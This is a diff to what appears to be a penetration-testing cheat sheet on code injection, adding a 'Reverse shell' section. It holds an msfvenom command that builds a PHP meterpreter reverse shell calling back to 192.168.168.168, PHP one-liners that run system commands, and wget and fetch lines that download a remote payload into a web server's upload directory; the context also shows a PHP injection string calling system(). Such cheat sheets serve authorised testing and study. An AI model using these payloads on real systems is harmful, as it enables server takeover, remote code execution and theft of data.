@@ -46,6 +46,20 @@ Try to find the correct number of ) and }
 Then ?order=id);}system('uname%20-a');//
 ````
 
+### Reverse shell
+
+
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.168 LPORT=443 R > revshell.php
+
+    
+
+    <?php echo (`whoami`); ?>
+    <?php echo (`ls -l /tmp/`); ?>
+    <?php echo `ifconfig`; ?>
+    <?php echo `wget -O /upload/directory/payload.php http://192.168.168.168/blackwinter.php`; ?>
+    <?php echo shell_exec("fetch -o /upload/directory/payload.php http://192.168.168.168/blackwinter.php"); ?>
+
+
 ## python
 ### print()
 Check with " or '
